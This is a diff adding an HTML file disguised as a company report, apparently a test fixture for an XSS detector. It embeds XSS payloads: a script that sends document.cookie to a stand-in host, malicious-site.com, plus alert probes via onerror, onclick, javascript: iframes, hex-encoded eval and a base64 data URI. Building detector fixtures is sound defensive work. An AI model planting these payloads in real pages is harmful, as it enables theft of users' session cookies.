@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Innocent Document</title>
+</head>
+<body>
+    <h1>Company Report</h1>
+    <p>This appears to be a legitimate business document...</p>
+    
+    <!-- MALICIOUS XSS PAYLOADS BELOW - WILL BE DETECTED -->
+    <script>
+        // XSS Payload 1: Cookie stealing
+        alert('XSS Attack Detected!');
+        document.location = 'http://malicious-site.com/steal?cookie=' + document.cookie;
+    </script>
+    
+    <p>Quarterly results show improvement in sales...</p>
+    
+    <!-- More XSS variants -->
+    <img src="x" onerror="alert('Image XSS Detected!')" />
+    
+    <div onclick="javascript:alert('Event Handler XSS')">Click here for details</div>
+    
+    <iframe src="javascript:alert('Iframe XSS Detected!')"></iframe>
+    
+    <!-- Obfuscated XSS -->
+    <script>
+        var encoded = '\x61\x6c\x65\x72\x74\x28\x22\x4f\x62\x66\x75\x73\x63\x61\x74\x65\x64\x20\x58\x53\x53\x22\x29';
+        eval(encoded);
+    </script>
+    
+    <p>End of legitimate content.</p>
+    
+    <!-- HTML injection -->
+    <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnSFRNTCBJbmplY3Rpb24nKTwvc2NyaXB0Pg=="></object>
+    
+</body>
+</html> 
